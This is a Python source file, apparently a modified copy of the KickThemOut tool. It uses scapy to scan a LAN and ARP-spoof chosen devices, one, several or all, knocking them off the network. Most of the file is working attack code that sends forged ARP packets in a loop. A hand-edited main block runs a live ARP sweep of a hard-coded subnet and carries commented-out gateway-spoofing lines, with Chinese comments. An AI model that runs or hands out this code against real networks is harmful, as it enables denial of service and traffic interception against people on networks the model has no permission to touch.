#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# kickthemout.py

"""
Copyright (C) 2017-18 Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

# from telnetlib import IP
from time import sleep

# from scapy.layers.inet import ICMP, IP
# from scapy.layers.l2 import ARP, Ether
from scapy.all import *

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def shutdown():
    print('\n\n{}Thanks for dropping by.'
          '\nCatch ya later!{}'.format(GREEN, END))
    os._exit(0)

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.config import conf  
    conf.ipv6_enabled = False
    from scapy.all import *
    import scan, spoof, nmap
    from urllib.request import urlopen, Request
    from urllib.error import URLError
except KeyboardInterrupt:
    shutdown()
except:
    print("\n{}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.".format(RED))
    print("\n{}If you still cannot resolve this error, please submit an issue here:\n\t{}https://github.com/k4m4/kickthemout/issues\n\n{}Details: {}{}{}".format(RED, BLUE, RED, GREEN, str(sys.exc_info()[1]), END))
    os._exit(1)



# display heading
def heading():
    spaces = " " * 76
    sys.stdout.write(GREEN + spaces + """
    █  █▀ ▄█ ▄█▄    █  █▀    ▄▄▄▄▀  ▄  █ ▄███▄   █▀▄▀█  ████▄   ▄      ▄▄▄▄▀
    █▄█   ██ █▀ ▀▄  █▄█   ▀▀▀ █    █   █ █▀   ▀  █ █ █  █   █    █  ▀▀▀ █
    █▀▄   ██ █   ▀  █▀▄       █    ██▀▀█ ██▄▄    █ ▄ █  █   █ █   █     █
    █  █  ▐█ █▄  ▄▀ █  █     █     █   █ █▄   ▄▀ █   █  ▀████ █   █    █
     █    ▐ ▀███▀    █     ▀         █  ▀███▀      █         █▄ ▄█   ▀
     ▀               ▀               ▀             ▀           ▀▀▀
    """ + END + BLUE +
    '\n' + '{}Kick Devices Off Your LAN ({}KickThemOut{}){}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
    '\n' + 'Made With <3 by: {0}Nikolaos Kamarinakis ({1}k4m4{2}) & {0}David Schütz ({1}xdavidhu{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(111) +
    '\n' + 'Version: {}2.0{} \n'.format(YELLOW, END).center(86))



# loading animation during network scan
def scanningAnimation(text):
    try:
        global stopAnimation
        i = 0
        while stopAnimation is not True:
            tempText = list(text)
            if i >= len(tempText):
                i = 0
            tempText[i] = tempText[i].upper()
            tempText = ''.join(tempText)
            sys.stdout.write(GREEN + tempText + '\r' + END)
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except:
        os._exit(1)



# display options
def optionBanner():
    print('\nChoose an option from the menu:\n')
    sleep(0.2)
    print('\t{}[{}1{}]{} Kick ONE Off'.format(YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\t{}[{}2{}]{} Kick SOME Off'.format(YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\t{}[{}3{}]{} Kick ALL Off'.format(YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\n\t{}[{}E{}]{} Exit KickThemOut\n'.format(YELLOW, RED, YELLOW, WHITE))



# initiate debugging process
def runDebug():
    print("\n\n{}WARNING! An unknown error has occurred, starting debug...{}".format(RED, END))
    print(
    "{}Starting debug... (Please report this crash on 'https://github.com/k4m4/kickthemout/issues' with your private information removed where necessary){}".format(
        RED, END))
    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print("Failed to print defaultGatewayMac...")
    try:
        print("Reloading MAC retriever function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print("Failed to reload MAC retriever function / to print defaultGatewayMac...")
    try:
        print("Known gateway IP: " + defaultGatewayIP)
    except:
        print("Failed to print defaultGatewayIP...")
    try:
        print("Crash trace: ")
        print(traceback.format_exc())
    except:
        print("Failed to print crash trace...")
    print("DEBUG FINISHED.\nShutting down...")
    print("{}".format(END))
    os._exit(1)



# make sure there is an internet connection
def checkInternetConnection():
    try:
        urlopen('https://github.com', timeout=3)
        return True
    except URLError as err:
        return False
    except KeyboardInterrupt:
        shutdown()



# retrieve network interface
def getDefaultInterface(returnNet=False):
    def long2net(arg):
        if (arg <= 0 or arg >= 0xFFFFFFFF):
            raise ValueError("illegal netmask value", hex(arg))
        return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))
    def to_CIDR_notation(bytes_network, bytes_netmask):
        network = scapy.utils.ltoa(bytes_network)
        netmask = long2net(bytes_netmask)
        net = "%s/%s" % (network, netmask)
        if netmask < 16:
            return None
        return net

    iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address, _ = max(iface_routes, key=lambda item:item[1])
    net = to_CIDR_notation(network, netmask)
    if net:
        if returnNet:
            return net
        else:
            return interface



# retrieve default interface MAC address
def getDefaultInterfaceMAC():
    try:
        defaultInterfaceMac = get_if_hwaddr(defaultInterface)
        if defaultInterfaceMac == "" or not defaultInterfaceMac:
            print(
            "\n{}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{}\n".format(
                RED, END))
            header = ('{}kickthemout{}> {}Enter MAC Address {}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
            return (input(header))
        else:
            return defaultInterfaceMac
    except:
        # request interface MAC address (after failed detection by scapy)
        print("\n{}ERROR: Default Interface MAC Address could not be obtained. Please enter MAC manually.{}\n".format(RED, END))
        header = ('{}kickthemout{}> {}Enter MAC Address {}(MM:MM:MM:SS:SS:SS): '.format(BLUE, WHITE, RED, END))
        return (input(header))



# retrieve gateway IP
def getGatewayIP():
    global stopAnimation
    try:
        getGateway, timeout = sr1(IP(dst="github.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False, timeout=4)
        if timeout:
            raise Exception()
        return getGateway.src
    except:
        # request gateway IP address (after failed detection by scapy)
        stopAnimation = True
        print("\n{}ERROR: Gateway IP could not be obtained. Please enter IP manually.{}\n".format(RED, END))
        header = ('{}kickthemout{}> {}Enter Gateway IP {}(e.g. 192.168.1.1): '.format(BLUE, WHITE, RED, END))
        return (input(header))



# retrieve host MAC address
def retrieveMACAddress(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
            break
    except:
        return False



# resolve mac address of each vendor
def resolveMac(mac):
    try:
        # send request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except KeyboardInterrupt:
        shutdown()
    except:
        return "N/A"



# regenerate online IPs array & configure gateway
def regenOnlineIPs():
    global onlineIPs, defaultGatewayMac, defaultGatewayMacSet, stopAnimation

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        stopAnimation = True
        print("\n{}ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.{}\n".format(RED, END))
        header = ("{}kickthemout{}> {}Enter your gateway's MAC Address {}(MM:MM:MM:SS:SS:SS): ".format(BLUE, WHITE, RED, END))
        defaultGatewayMac = input(header)
        defaultGatewayMacSet = True



# scan network
def scanNetwork():
    global hostsList
    try:
        # call scanning function from scan.py
        hostsList = scan.scanNetwork(getDefaultInterface(True))
    except KeyboardInterrupt:
        shutdown()
    except:
        print("\n\n{}ERROR: Network scanning failed. Please check your requirements configuration.{}".format(RED, END))
        print("\n{}If you still cannot resolve this error, please submit an issue here:\n\t{}https://github.com/k4m4/kickthemout/issues\n\n{}Details: {}{}{}".format(RED, BLUE, RED, GREEN, str(sys.exc_info()[1]), END))
        os._exit(1)
    try:
        regenOnlineIPs()
    except KeyboardInterrupt:
        shutdown()



# non-interactive attack
def nonInteractiveAttack():

    print("\n{}nonInteractiveAttack{} activated...{}\n".format(RED, GREEN, END))

    target = options.targets
    print("\n{}Target(s): {}{}".format(GREEN, END, ", ".join(target)))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Checking target status...',))
    t.daemon = True
    t.start()

    try:
        nm = nmap.PortScanner()
        counter = 0
        for host in target:
            a = nm.scan(hosts=host, arguments='-sn')
            if a['scan'] != {}:
                for k, v in a['scan'].items():
                    if str(v['status']['state']) == 'up':
                        pass
                    else:
                        if len(target) == 1 or counter == len(target)-1:
                            stopAnimation = True
                            sys.stdout.write("\033[K")
                            print("\n{}ERROR: Target {}{}{} doesn't seem to be alive. Exiting...{}".format(RED, END, str(host), RED, END))
                            os._exit(1)
                        else:
                            sys.stdout.write("\033[K")
                            print("\n{}WARNING: Target {}{}{} doesn't seem be alive. Skipping...{}".format(RED, END, str(host), RED, END))
                            target.remove(host)
                            counter += 1
                            pass
            else:
                if len(target) == 1 or counter == len(target)-1:
                    stopAnimation = True
                    sys.stdout.write("\033[K")
                    print("\n{}ERROR: Target {}{}{} doesn't seem to be alive. Exiting...{}".format(RED, END, str(host), RED, END))
                    os._exit(1)
                else:
                    sys.stdout.write("\033[K")
                    print("\n{}WARNING: Target {}{}{} doesn't seem be alive. Skipping...{}".format(RED, END, str(host), RED, END))
                    target.remove(host)
                    counter += 1
                    pass

        stopAnimation = True
        sys.stdout.write("\033[K")

        defaultGatewayIP = getGatewayIP()
        defaultGatewayMac = retrieveMACAddress(defaultGatewayIP)

    except KeyboardInterrupt:
        shutdown()

    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))
    try:
        while True:
            # broadcast malicious ARP packets
            for i in target:
                ipAddress = i
                macAddress = retrieveMACAddress(ipAddress)
                if macAddress == False:
                    print("\n{}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{}".format(RED, END))
                    os._exit(1)
                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, ipAddress, macAddress)
            if options.packets is not None:
                time.sleep(60/float(options.packets))
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\n{}Re-arping{} target(s)...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in target:
                ipAddress = i
                try:
                    macAddress = retrieveMACAddress(ipAddress)
                except:
                    print("\n{}ERROR: MAC address of target host could not be retrieved! Maybe host is down?{}".format(RED, END))
                    os._exit(1)
                try:
                    spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, ipAddress, macAddress)
                except KeyboardInterrupt:
                    pass
                except:
                    runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} target(s) successfully.{}".format(RED, GREEN, END))



# kick one device
def kickoneoff():
    os.system("clear||cls")

    print("\n{}kickONEOff{} selected...{}\n".format(RED, GREEN, END))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
    t.daemon = True
    t.start()

    # commence scanning process
    try:
        scanNetwork()
    except KeyboardInterrupt:
        shutdown()
    stopAnimation = True

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        try:
            hostname = utils.socket.gethostbyaddr(onlineIPs[i])[0]
        except:
            hostname = "N/A"
        vendor = resolveMac(mac)
        print("  [{}{}{}] {}{}{}\t{}{}\t{} ({}{}{}){}".format(YELLOW, str(i), WHITE, RED, str(onlineIPs[i]), BLUE, mac, GREEN, vendor, YELLOW, hostname, GREEN, END))

    canBreak = False
    while not canBreak:
        try:
            choice = int(input("\nChoose a target: "))
            oneTargetIP = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            shutdown()
        except:
            print("\n{}ERROR: Please enter a number from the list!{}".format(RED, END))

    # locate MAC of specified device
    oneTargetMAC = ""
    for host in hostsList:
        if host[0] == oneTargetIP:
            oneTargetMAC = host[1]
    if oneTargetMAC == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\n{}Target: {}{}".format(GREEN, END, oneTargetIP))

    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))
    try:
        while True:
            # broadcast malicious ARP packets
            spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
            if options.packets is not None:
                time.sleep(60/float(options.packets))
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\n{}Re-arping{} target...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} target successfully.{}".format(RED, GREEN, END))



# kick multiple devices
def kicksomeoff():
    os.system("clear||cls")

    print("\n{}kickSOMEOff{} selected...{}\n".format(RED, GREEN, END))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
    t.daemon = True
    t.start()

    # commence scanning process
    try:
        scanNetwork()
    except KeyboardInterrupt:
        shutdown()
    stopAnimation = True

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        try:
            hostname = utils.socket.gethostbyaddr(onlineIPs[i])[0]
        except:
            hostname = "N/A"
        vendor = resolveMac(mac)
        print("  [{}{}{}] {}{}{}\t{}{}\t{} ({}{}{}){}".format(YELLOW, str(i), WHITE, RED, str(onlineIPs[i]), BLUE, mac, GREEN, vendor, YELLOW, hostname, GREEN, END))

    canBreak = False
    while not canBreak:
        try:
            choice = input("\nChoose devices to target (comma-separated): ")
            if ',' in choice:
                someTargets = choice.split(",")
                canBreak = True
            else:
                print("\n{}ERROR: Please select more than 1 devices from the list.{}\n".format(RED, END))
        except KeyboardInterrupt:
            shutdown()

    someIPList = ""
    for i in someTargets:
        try:
            someIPList += onlineIPs[int(i)] + ", "
        except KeyboardInterrupt:
            shutdown()
        except:
            print("\n{}ERROR: '{}{}{}' is not in the list.{}\n".format(RED, GREEN, i, RED, END))
            return
    someIPList = someIPList[:-2] + END

    print("\n{}Targets: {}{}".format(GREEN, END, someIPList))

    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))
    try:
        while True:
            # broadcast malicious ARP packets
            for i in someTargets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            if options.packets is not None:
                time.sleep(60/float(options.packets))
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in someTargets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        try:
                            spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))



# kick all devices
def kickalloff():
    os.system("clear||cls")

    print("\n{}kickALLOff{} selected...{}\n".format(RED, GREEN, END))
    global stopAnimation
    stopAnimation = False
    t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
    t.daemon = True
    t.start()

    # commence scanning process
    try:
        scanNetwork()
    except KeyboardInterrupt:
        shutdown()
    stopAnimation = True

    print("Target(s): ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        try:
            hostname = utils.socket.gethostbyaddr(onlineIPs[i])[0]
        except:
            hostname = "N/A"
        vendor = resolveMac(mac)
        print("  [{}{}{}] {}{}{}\t{}{}\t{} ({}{}{}){}".format(YELLOW, str(i), WHITE, RED, str(onlineIPs[i]), BLUE, mac, GREEN, vendor, YELLOW, hostname, GREEN, END))
    
    if options.packets is not None:
        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
    else:
        print("\n{}Spoofing started... {}".format(GREEN, END))
    try:
        # broadcast malicious ARP packets
        reScan = 0
        while True:
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    # dodge gateway (avoid crashing network itself)
                    spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            if options.packets is not None:
                time.sleep(60/float(options.packets))
            else:
                time.sleep(10)
    except KeyboardInterrupt:
        print("\n{}Re-arping{} targets...{}".format(RED, GREEN, END))
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    try:
                        # dodge gateway
                        spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
            reArp += 1
            time.sleep(0.2)
        print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))



# script's main function
def main():

    # display heading
    heading()

    if interactive:

        print("\n{}Using interface '{}{}{}' with MAC address '{}{}{}'.\nGateway IP: '{}{}{}' --> {}{}{} hosts are up.{}".format(
            GREEN, RED, defaultInterface, GREEN, RED, defaultInterfaceMac, GREEN, RED, defaultGatewayIP, GREEN, RED, str(len(hostsList)), GREEN, END))
        # display warning in case of no active hosts
        if len(hostsList) == 0 or len(hostsList) == 1:
            if len(hostsList) == 1:
                if hostsList[0][0] == defaultGatewayIP:
                    print("\n{}{}WARNING: There are {}0 hosts up{} on you network except your gateway.\n\tYou can't kick anyone off {}:/{}\n".format(
                        GREEN, RED, GREEN, RED, GREEN, END))
                    os._exit(1)
            else:
                print(
                "\n{}{}WARNING: There are {}0 hosts{} up on you network.\n\tIt looks like something went wrong {}:/{}".format(
                    GREEN, RED, GREEN, RED, GREEN, END))
                print(
                "\n{}If you are experiencing this error multiple times, please submit an issue here:\n\t{}https://github.com/k4m4/kickthemout/issues\n{}".format(
                    RED, BLUE, END))
                os._exit(1)

    else:
        print("\n{}Using interface '{}{}{}' with MAC address '{}{}{}'.\nGateway IP: '{}{}{}' --> Target(s): '{}{}{}'.{}".format(
            GREEN, RED, defaultInterface, GREEN, RED, defaultInterfaceMac, GREEN, RED, defaultGatewayIP, GREEN, RED, ", ".join(options.targets), GREEN, END))

    if options.targets is None and options.scan is False:
        try:

            while True:
                optionBanner()

                header = ('{}kickthemout{}> {}'.format(BLUE, WHITE, END))
                choice = input(header)

                if choice.upper() == 'E' or choice.upper() == 'EXIT':
                    shutdown()

                elif choice == '1':
                    kickoneoff()

                elif choice == '2':
                    kicksomeoff()

                elif choice == '3':
                    kickalloff()

                elif choice.upper() == 'CLEAR':
                    os.system("clear||cls")
                else:
                    print("\n{}ERROR: Please select a valid option.{}\n".format(RED, END))

        except KeyboardInterrupt:
            shutdown()

    elif options.scan is not False:
        stopAnimation = False
        t = threading.Thread(target=scanningAnimation, args=('Scanning your network, hang on...',))
        t.daemon = True
        t.start()
    
        # commence scanning process
        try:
            scanNetwork()
        except KeyboardInterrupt:
            shutdown()
        stopAnimation = True
    
        print("\nOnline IPs: ")
        for i in range(len(onlineIPs)):
            mac = ""
            for host in hostsList:
                if host[0] == onlineIPs[i]:
                    mac = host[1]
            try:
                hostname = utils.socket.gethostbyaddr(onlineIPs[i])[0]
            except:
                hostname = "N/A"
            vendor = resolveMac(mac)
            print("  [{}{}{}] {}{}{}\t{}{}\t{} ({}{}{}){}".format(YELLOW, str(i), WHITE, RED, str(onlineIPs[i]), BLUE, mac, GREEN, vendor, YELLOW, hostname, GREEN, END))

    else:
        nonInteractiveAttack()



if __name__ == '__main__':

    # configure appropriate network info
    # try:
    #     # defaultInterface = getDefaultInterface()
    #     defaultGatewayIP = getGatewayIP()
    #     defaultInterfaceMac = getDefaultInterfaceMAC()
    #     global defaultGatewayMacSet
    #     defaultGatewayMacSet = False
    # except KeyboardInterrupt:
    #     shutdown()

    local_mac = 'a4:83:e7:3a:f3:07'
    local_mac_new = 'a4:83:e7:3a:f3:08'
    dst_addr = "192.168.31.109"
    local_ip = '192.168.31.234'
    intername = 'en0'
    try:
        # 发送ARP请求并等待响应
        # op=1表示请求，op=2表示响应
        # 当op=1,hwsrc=表示本地mac，hwdst表示广播(首包)，psrc表示本地IP，pdst表示目的IP
        # result_raw = sr1(ARP(op=1,
        #                      hwsrc=local_mac,
        #                      hwdst='00:00:00:00:00:00',
        #                      psrc=local_ip,
        #                      pdst=dst_addr),
        #                  iface="any",
        #                  timeout=1,
        #                  verbose=False)
        # print(result_raw.show())
        # # 返回目的IP地址，和目的MAC地址，getlayer(ARP)取整个ARP数据包，
        # from scapy.all import *
        # result_raw = srp(
        #     Ether(src=local_mac, dst='FF:FF:FF:FF:FF:FF') / ARP(op=1, hwsrc=local_mac, hwdst='00:00:00:00:00:00',
        #                                                        psrc=local_ip, pdst=dst_addr), iface=intername, timeout=1,
        #     verbose=False)
        # print("srp返回的类型", type(result_raw));
        #
        # print("srp返回的信息:", result_raw);

        wifi = 'en0'
        # 模拟发包,向整个网络发包，如果有回应，则表示活跃的主机
        p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst='192.168.31.0/24')
        # ans表示收到的包的回复
        ans, unans = srp(p, iface=wifi, timeout=2)
        print("一共扫描到%d台主机：" % len(ans))

        # 将需要的IP地址和Mac地址存放在result列表中
        result = []
        for s, r in ans:
            # 解析收到的包，提取出需要的IP地址和MAC地址
            result.append([r[ARP].psrc, r[ARP].hwsrc])
        # 将获取的信息进行排序，看起来更整齐一点
        result.sort()
        # 打印出局域网中的主机
        for ip, mac in result:
            print(ip, '------>', mac)

        # res = sr1(ARP(pdst="192.168.31.109"))
        # print(res.hwsrc)
        # gate_way_ip = '192.168.31.109'
        # srloop(ARP(psrc=gate_way_ip, hwsrc=local_mac_new, pdst="192.168.31.1", op=2))

        # 局域网ARP欺骗
        # srploop(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc="00:e0:70:52:54:26", psrc="192.168.31.1", op=2))

        # # 首先要选择网卡的接口，就需要查看网卡接口有什么,在进行选择
        # print(show_interfaces())
        # wifi = 'en0'
        #
        # # 查看抓取到的数据包
        # pkts = sniff(iface=wifi, count=3, filter='arp')
        # print(pkts)


    except AttributeError:
        print(AttributeError.with_traceback())

